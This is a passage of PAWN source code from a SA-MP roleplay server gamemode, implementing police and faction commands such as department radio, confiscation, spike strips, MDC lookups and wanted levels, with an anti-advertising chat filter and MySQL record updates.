			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]", depmsj)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/d <Message>");
		if(FindIP(depmsj)) /// Anti-Reclama
        {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
	        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /d.", advertiser, playerid, depmsj);
			ABroadCast(COLOR_SERVER,string,1);
        }
        for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(depmsj, TLD[i], true) != -1)
			{
				if(strfind(depmsj, "wwww.Magic-Gaming.tk", true) != -1 || strfind(depmsj, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(depmsj, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /d.", advertiser, playerid, depmsj);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		if(member == 2 || leader == 2 || member == 3 || leader == 3)
		{
  			if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "*** %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7], sendername, depmsj); }
	  		else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "*** %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj); }
			else
			{
				format(string, sizeof(string), "* %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj);
			}
			SendTeamMessage(14, COLOR_DEPART, string);
			SendTeamMessage(8, COLOR_DEPART, string);
			SendTeamMessage(3, COLOR_DEPART, string);
			SendTeamMessage(2, COLOR_DEPART, string);
			SendTeamMessage(1, COLOR_DEPART, string);
			SendTeamMessage(15, COLOR_DEPART, string);
			printf("%s", string);
			format(string, sizeof(string), "(radio) ''%s''",params);
    		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
			return 1;
		}
		if(member == 1 || leader == 1)
		{
			if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "*** LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7], sendername, depmsj); }
	  		else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "*** LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "* LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "* LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "* LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "* LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj); }
			else
			{
				format(string, sizeof(string), "* LS %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj);
			}
			SendTeamMessage(14, COLOR_DEPART, string);
			SendTeamMessage(8, COLOR_DEPART, string);
			SendTeamMessage(3, COLOR_DEPART, string);
			SendTeamMessage(2, COLOR_DEPART, string);
			SendTeamMessage(1, COLOR_DEPART, string);
			SendTeamMessage(15, COLOR_DEPART, string);
			printf("%s", string);
			format(string, sizeof(string), "(radio) ''%s''",params);
    		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
			return 1;
		}
		if(member == 15 || leader == 15)
		{
			if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "*** SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7], sendername, depmsj); }
	  		else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "*** SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "* SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "* SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "* SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "* SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj); }
			else
			{
				format(string, sizeof(string), "* SF %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj);
			}
			SendTeamMessage(14, COLOR_DEPART, string);
			SendTeamMessage(8, COLOR_DEPART, string);
			SendTeamMessage(3, COLOR_DEPART, string);
			SendTeamMessage(2, COLOR_DEPART, string);
			SendTeamMessage(1, COLOR_DEPART, string);
			SendTeamMessage(15, COLOR_DEPART, string);
			printf("%s", string);
			format(string, sizeof(string), "(radio) ''%s''",params);
    		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
			return 1;
		}
		if(member == 8 || leader == 8)
		{
			if(PlayerInfo[playerid][pRank] == 7) { format(string, sizeof(string), "*** LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName7], sendername, depmsj); }
	  		else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "*** LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName6], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName5], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "* LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName4], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "* LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName3], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "* LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName2], sendername, depmsj); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "* LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj); }
			else
			{
				format(string, sizeof(string), "* LV %s %s: %s, over.", DynamicFactions[PlayerInfo[playerid][pMember]][fRankName1], sendername, depmsj);
			}
			SendTeamMessage(14, COLOR_DEPART, string);
			SendTeamMessage(8, COLOR_DEPART, string);
			SendTeamMessage(3, COLOR_DEPART, string);
			SendTeamMessage(2, COLOR_DEPART, string);
			SendTeamMessage(1, COLOR_DEPART, string);
			SendTeamMessage(15, COLOR_DEPART, string);
			printf("%s", string);
			format(string, sizeof(string), "(radio) ''%s''",params);
    		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 10.0, 10000);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You are not part of a department.");
			return 1;
		}
	}
	return 1;
}
CMD:d(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_departments(playerid, params);
}
CMD:confiscate(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(IsACop(playerid))
        {
            if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{3385FF}You are not on Duty.");
	        new x_nr[15],giveplayerid,string[256],giveplayer[25],sendername[25];
			if(sscanf(params, "us[15]",giveplayerid,x_nr))
			{
				SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/confiscate <Name/Playerid> <Item>");
		  		SendClientMessage(playerid, COLOR_SERVER, "Items: Licence, Drugs, Materials, Weapons.");
				return 1;
			}
			GetPlayerName(playerid,sendername,sizeof(sendername));
			GetPlayerName(giveplayerid,giveplayer,sizeof(giveplayer));
		    if(strcmp(x_nr,"licence",true) == 0)
			{
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
							format(string, sizeof(string), "* %s has confiscated %s's driving license.", sendername, giveplayer);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							SendTeamMessage(8, COLOR_LIGHTBLUE, string);
							SendTeamMessage(3, COLOR_LIGHTBLUE, string);
							SendTeamMessage(2, COLOR_LIGHTBLUE, string);
							SendTeamMessage(1, COLOR_LIGHTBLUE, string);
							SendTeamMessage(15, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have confiscated %s's driving license.", giveplayer);
					        SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "%s has confiscated your driving license.", sendername);
					        SendClientMessage(giveplayerid, COLOR_SERVER, string);
							PlayerInfo[giveplayerid][pCarLicSuspend] = 2;
					        PlayerInfo[giveplayerid][pCarLic] = 0;
					        PlayerInfo[giveplayerid][pCarLicT] = 0;
							Update(giveplayerid, pCarLicSuspendx);
							PlayerInfo[playerid][pLConfiscate] += 1;
							Update(playerid,pLConfiscatex);
							new str[128];
							mysql_format(SQL,str,sizeof(str),"UPDATE users SET `CarLic`='0',`CarLicT`='0' WHERE `name`='%s'",PlayerInfo[giveplayerid][pNormalName]);
							mysql_tquery(SQL,str,"","");
						}
						else return SendClientMessage(playerid, COLOR_SERVER,"{C1F589}This player is not near you.");
				    }
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else if(strcmp(x_nr,"weapons",true) == 0)
			{
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
							format(string, sizeof(string), "* %s has confiscated %s's weapons.", sendername, giveplayer);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							SendTeamMessage(8, COLOR_LIGHTBLUE, string);
							SendTeamMessage(3, COLOR_LIGHTBLUE, string);
							SendTeamMessage(2, COLOR_LIGHTBLUE, string);
							SendTeamMessage(1, COLOR_LIGHTBLUE, string);
							SendTeamMessage(15, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "You have confiscated %s's weapons.", giveplayer);
					        SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "%s has confiscated your weapons.", sendername);
					        SendClientMessage(giveplayerid, COLOR_SERVER, string);
					        ResetPlayerWeaponsEx(giveplayerid);
					        ResetPlayerWeapons(giveplayerid);
						}
						else return SendClientMessage(playerid, COLOR_SERVER,"{C1F589}This player is not near you.");
				    }
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else if(strcmp(x_nr,"materials",true) == 0)
			{
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    format(string, sizeof(string), "* %s has confiscated %s's materials.", sendername, giveplayer);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							SendTeamMessage(8, COLOR_LIGHTBLUE, string);
							SendTeamMessage(3, COLOR_LIGHTBLUE, string);
							SendTeamMessage(2, COLOR_LIGHTBLUE, string);
							SendTeamMessage(1, COLOR_LIGHTBLUE, string);
							SendTeamMessage(15, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "You have confiscated %s's materials.", giveplayer);
					        SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "%s has confiscated your materials.", sendername);
					        SendClientMessage(giveplayerid, COLOR_SERVER, string);
					        PlayerInfo[giveplayerid][pMats] = 0;
							new str[128];
							mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Materials`='0' WHERE `name`='%s'",PlayerInfo[giveplayerid][pNormalName]);
							mysql_tquery(SQL,str,"","");
						}
						else return SendClientMessage(playerid, COLOR_SERVER,"{C1F589}This player is not near you.");
				    }
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else if(strcmp(x_nr,"drugs",true) == 0)
			{
                if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid, COLOR_GRAD1, "You need to be Rank 2 or Higher for this action.");
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    format(string, sizeof(string), "* %s has confiscated %s's drugs.", sendername, giveplayer);
							ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							SendTeamMessage(8, COLOR_LIGHTBLUE, string);
							SendTeamMessage(3, COLOR_LIGHTBLUE, string);
							SendTeamMessage(2, COLOR_LIGHTBLUE, string);
							SendTeamMessage(1, COLOR_LIGHTBLUE, string);
							SendTeamMessage(15, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "You have confiscated %s's drugs.", giveplayer);
					        SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "%s has confiscated your drugs.", sendername);
					        SendClientMessage(giveplayerid, COLOR_SERVER, string);
					        PlayerInfo[giveplayerid][pDrugs] = 0;
					        PlayerInfo[playerid][pDConfiscate] += 1;
							Update(playerid,pDConfiscatex);
							new str[128];
							mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Drugs`='0' WHERE `name`='%s'",PlayerInfo[giveplayerid][pNormalName]);
							mysql_tquery(SQL,str,"","");
						}
						else return SendClientMessage(playerid, COLOR_SERVER,"{C1F589}This player is not near you.");
				    }
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else return SendClientMessage(playerid, COLOR_GRAD1, "Unknown take name.");
        }
        else return SendClientMessage(playerid,  COLOR_SERVER, "{FFB870}You are not a cop.");
    }
    return 1;
}
CMD:deployspike(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if(IsACop(playerid) && PlayerInfo[playerid][pRank] >= 4)
 	    {
 	    	if(GetPlayerState(playerid) == 1)
	 		{
	 	    	new x = -1,string[76];
  	 			for(new i; i < MAX_SPIKES; i++)
		 		{
					if(SpikeInfo[i][sPos][0] == 0 && SpikeInfo[i][sPos][1] == 0 && SpikeInfo[i][sPos][2] == 0) {
						x = i;
						break;
					}
				}
				if(x != -1)
				{
					GetPlayerPos(playerid, SpikeInfo[x][sPos][0], SpikeInfo[x][sPos][1], SpikeInfo[x][sPos][2]);
					GetPlayerFacingAngle(playerid, SpikeInfo[x][sPos][3]);
					SpikeInfo[x][sObjID] = CreateDynamicObject(2899, SpikeInfo[x][sPos][0], SpikeInfo[x][sPos][1], SpikeInfo[x][sPos][2] - 0.8, 0.0, 0.0, SpikeInfo[x][sPos][3], GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), -1, 200.0);
					GetPlayerName(playerid, SpikeInfo[x][sDeployer], MAX_PLAYER_NAME);
					format(string, sizeof(string),"You have successfully deployed a spike (ID %d).", x);
					SendClientMessage(playerid, COLOR_SERVER, string);
				}
				else
				{
					format(string, sizeof(string), "No more spike strips can be deployed (the limit is %d). Destroy some first.", MAX_SPIKES);
					SendClientMessage(playerid, COLOR_GREY, string);
				}
        	}
			else SendClientMessage(playerid, COLOR_GREY, "You can only deploy spikes while on foot.");
		}
		else return SendClientMessage(playerid, COLOR_GREY, "You are not a cop or you don't have rank 4.");
	}
	return 1;
}
CMD:destroyspike(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if(IsACop(playerid) && PlayerInfo[playerid][pRank] >= 4)
 	    {
 	    	new targetID,string[75];
 	    	if(!isnull(params))
	 		{
	 	    	targetID = strval(params);
				if(SpikeInfo[targetID][sPos][0] != 0 && SpikeInfo[targetID][sPos][1] != 0 && SpikeInfo[targetID][sPos][2] != 0)
				{
					DestroyDynamicObject(SpikeInfo[targetID][sObjID]);
					for(new i; i < 4; i++) SpikeInfo[targetID][sPos][i] = 0;
					SpikeInfo[targetID][sObjID] = INVALID_OBJECT_ID;
					format(SpikeInfo[targetID][sDeployer], MAX_PLAYER_NAME, "(null)");
					format(string, sizeof(string), "You have successfully destroyed spike ID %d.", targetID);
					SendClientMessage(playerid, COLOR_SERVER, string);
				}
				else SendClientMessage(playerid, COLOR_GREY, "Invalid spike specified.");
			}
			else SendClientMessage(playerid, COLOR_GREY, "{A9C4E4}Usage: {FFFFFF}/destroyspike [spike]");
		}
		else return SendClientMessage(playerid, COLOR_GREY, "You are not a cop or you don't have rank 4.");
	}
	return 1;
}
CMD:spikes(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if(IsACop(playerid) && PlayerInfo[playerid][pRank] >= 5)
 	    {
        	new dString[128],sZone[MAX_ZONE_NAME],x,y;
       		SendClientMessage(playerid, COLOR_TEAL, "---------------------------------------------------------------------------------------------------------------------------------");
			SendClientMessage(playerid, COLOR_SERVER, "Deployed spike strips:");
			for(new i; i < MAX_SPIKES; i++)
			{
				if(SpikeInfo[i][sPos][0] != 0 && SpikeInfo[i][sPos][1] != 0 && SpikeInfo[i][sPos][2] != 0)
				{
					Get2DPosZone(SpikeInfo[i][sPos][0], SpikeInfo[i][sPos][1], sZone, MAX_ZONE_NAME); // Edited a_zones function (GET INCLUDE FROM SVN!!1)
					y++;
					if(x == 0) format(dString, sizeof(dString), "ID %d (%s, deployed by %s)", i, sZone, SpikeInfo[i][sDeployer]);
					else format(dString, sizeof(dString), "%s | ID %d (%s, deployed by %s)", dString, i, sZone, SpikeInfo[i][sDeployer]);
					x++;
					if(x == 2) {
						SendClientMessage(playerid, COLOR_SERVER, dString);
						x = 0;
					}
				}
			}
			if(x == 1) SendClientMessage(playerid, COLOR_SERVER, dString);
			if(y == 0) SendClientMessage(playerid, COLOR_SERVER, "No spike strips are currently deployed.");
			SendClientMessage(playerid, COLOR_TEAL, "---------------------------------------------------------------------------------------------------------------------------------");
		}
		else return SendClientMessage(playerid, COLOR_GREY, "You are not a cop or you don't have rank 5.");
	}
	return 1;
}
CMD:mdc(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
  		if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
		new id,string[256],sendername[MAX_PLAYER_NAME];
		if(sscanf(params, "u", id)) return SCM(playerid,0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/mdc <Name/Playerid>");
		{
				if(IsPlayerConnected(id))
				{
    				GetPlayerName(id, sendername, sizeof(sendername));
					if(PlayerInfo[id][pWantedLevel] > 0)
					{
						format(string, sizeof(string), "-- MDC [ID %d - %s][{FFFF00}W:%d{FFFFFF}][Chased by %d cops][Wanted expires in %d mins]",id, sendername, PlayerInfo[id][pWantedLevel], cased[id], wantedlost[id]/60+1);
					}
					else if(PlayerInfo[id][pWantedLevel] < 1)
					{
						format(string, sizeof(string), "-- MDC [ID %d - %s][not wanted]",id, sendername);
					}
					SendClientMessage(playerid, COLOR_SERVER,string);
					if(strcmp(PlayerInfo[id][pCrime1],  "Fara Crima", false) == 0 || strcmp(PlayerInfo[id][pCrime1],  "Fara", false) == 0) { }
					else
					{
						format(string, sizeof(string), "%s", PlayerInfo[id][pCrime1]);
						SendClientMessage(playerid,COLOR_SERVER,string);
					}
					if(strcmp(PlayerInfo[id][pCrime2],  "Fara Crima", false) == 0 || strcmp(PlayerInfo[id][pCrime1],  "Fara", false) == 0) { }
					else
					{
						format(string, sizeof(string), "%s", PlayerInfo[id][pCrime2]);
						SendClientMessage(playerid, COLOR_SERVER,string);
					}
					if(strcmp(PlayerInfo[id][pCrime3], "Fara Crima", false) == 0 || strcmp(PlayerInfo[id][pCrime1],  "Fara", false) == 0) { }
					else
					{
						format(string, sizeof(string), "%s", PlayerInfo[id][pCrime3]);
						SendClientMessage(playerid, COLOR_SERVER,string);
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				    return 1;
				}
		}
  	}
	return 1;
}
CMD:su(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new id,level,reason[64],giveplayer[30],sendername[25],string[256],ini;
	if(IsACop(playerid))
	{
		if(sscanf(params, "uis[64]", id,level,reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/su <Name/Playerid> <level> <reason>");
		if(FindIP(reason)) /// Anti-Reclama
        {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
	        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /su.", advertiser, playerid, reason);
			ABroadCast(COLOR_SERVER,string,1);
        }
        for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(reason, TLD[i], true) != -1)
			{
				if(strfind(reason, "wwww.Magic-Gaming.tk", true) != -1 || strfind(reason, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(reason, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /su.", advertiser, playerid, reason);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		GetPlayerName(id, giveplayer, sizeof(giveplayer));
  		GetPlayerName(playerid, sendername, sizeof(sendername));
		{
			if(IsPlayerConnected(id))
			{
				if(level < 7 && level > 0)
				{
					if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: You aren't on duty.");
					if(IsACop(id)) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: You can't suspect a Cop!");
					ini = PlayerInfo[id][pWantedLevel];
					if(PlayerInfo[id][pJailTime] > 0) return SCM(playerid, COLOR_SERVER, "{C1F589}Error: You can't suspect an arrested player!");
					Tigaanel[id] = 1;
					DestroyDynamic3DTextLabel(WantedScris[id]);
					if(level + PlayerInfo[id][pWantedLevel] > 6)
					{
						PlayerInfo[id][pWantedLevel] = 6;
						new str21[256];
        				format(str21,sizeof(str21),"Wanted Level: 6", PlayerInfo[playerid][pWantedLevel]);
        				WantedScris[id] = CreateDynamic3DTextLabel(str21, COLOR_SERVER, 0, 0, -20, 20, id);
						Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, WantedScris[id] , E_STREAMER_ATTACH_OFFSET_Z, 0.48);
					}
					else
					{
					    new str21[256];
        				format(str21,sizeof(str21),"{FF6600}Wanted Level: %d", level+PlayerInfo[id][pWantedLevel]);
        				WantedScris[id] = CreateDynamic3DTextLabel(str21, COLOR_SERVER, 0, 0, -20, 20, id);
						Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, WantedScris[id] , E_STREAMER_ATTACH_OFFSET_Z, 0.48);
						PlayerInfo[id][pWantedLevel] = level+PlayerInfo[id][pWantedLevel];
					}
					format(string, sizeof(string), "Unknown");
					strmid(PlayerInfo[id][pVictim], string, 0, strlen(string), 255);
					Update(id,pVictimx);
					strmid(PlayerInfo[id][pAccused], PlayerInfo[playerid][pNormalName], 0, 25, 255);
					Update(id,pAccusedx);
					new y,m,d,h,mi,s;
					getdate(y,m,d);
					gettime(h,mi,s);
					if(strcmp(PlayerInfo[id][pCrime1], "Fara Crima", true) == 0)
					{
		    			format(string,sizeof(string),"%s",reason);
						strmid(PlayerInfo[id][pCrime1], string, 0, strlen(string), 255);
						Update(id,pCrime1x);
					}
					else if(strcmp(PlayerInfo[id][pCrime2], "Fara Crima", true) == 0)
					{
		    			format(string,sizeof(string),"%s",reason);
						strmid(PlayerInfo[id][pCrime2], string, 0, strlen(string), 255);
						Update(id,pCrime2x);
					}
					else if(strcmp(PlayerInfo[id][pCrime3], "Fara Crima", true) == 0)
					{
		    			format(string,sizeof(string),"%s",reason);
					    strmid(PlayerInfo[id][pCrime3], string, 0, strlen(string), 255);
						Update(id,pCrime3x);
					}
					else if(strcmp(PlayerInfo[id][pCrime1],  "Fara Crima", true) == 0 && strcmp(PlayerInfo[id][pCrime2], "Fara Crima", true) == 0 && strcmp(PlayerInfo[id][pCrime3], "Fara Crima", true) == 0) { }
					else
					{
						format(string,sizeof(string),"%s",reason);
					    strmid(PlayerInfo[id][pCrime1], string, 0, strlen(string), 255);
						Update(id,pCrime1x);
						format(string, sizeof(string), "Fara Crima");
						strmid(PlayerInfo[id][pCrime2], string, 0, strlen(string), 255);
						strmid(PlayerInfo[id][pCrime3], string, 0, strlen(string), 255);
						Update(id,pCrime2x);
						Update(id,pCrime3x);
					}
					SetPlayerWantedLevel(id,PlayerInfo[id][pWantedLevel]);
					ini = PlayerInfo[id][pWantedLevel]-ini;
					format(string, sizeof(string), "You committed a crime: %s, reporter: %s. W: +%d. New Wanted Level: %d.",reason,sendername,ini,PlayerInfo[id][pWantedLevel]);
					SendClientMessage(id, COLOR_RED2, string);
					format(string, sizeof(string), "Dispatch: %s [%d] has commited a crime: %s. Reporter: %s. W: +%d. New wanted level: %d.",giveplayer,id,reason,sendername,ini,PlayerInfo[id][pWantedLevel]);
                    SendTeamMessage(8, COLOR_DBLUE, string);
					SendTeamMessage(3, COLOR_DBLUE, string);
					SendTeamMessage(2, COLOR_DBLUE, string);
					SendTeamMessage(1, COLOR_DBLUE, string);
					SendTeamMessage(15, COLOR_DBLUE, string);
					wantedlost[id] = 1800;
					Update(id,pWantedLevelx);
					WantedPoints[id] = PlayerInfo[id][pWantedLevel]*2;
					PlayerTextDrawShow(id, WantedText[id]);
					new var100[256],string2[256];
					format(string2,sizeof(string2),"[%02d-%02d-%i%s.",d,m,y,h,mi,s,sendername,PlayerInfo[playerid][pSQLID],level,giveplayer,PlayerInfo[id][pSQLID],reason);
					if(IsPlayerAFK[id] > 0)
					{
						format(string, sizeof(string), "Policeman %s granted you wanted %d, reason: %s.",sendername,ini,reason);
						mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[id][pSQLID],string);
						mysql_tquery(SQL,var100,"","");
					}
					new str1[256];
        			format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[id]/60+1);
					PlayerTextDrawSetString(id, WantedText[id], str1);
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Invalid wanted level.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
	return 1;
}
CMD:members(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] >= 1 && PlayerInfo[playerid][pRank] >= 6)
	{
		new aim[3000],
			query[300],
			test[300],
			test1,
			aimtotal[3000],
			idd = 0,
			mid = 0,
			result[300];
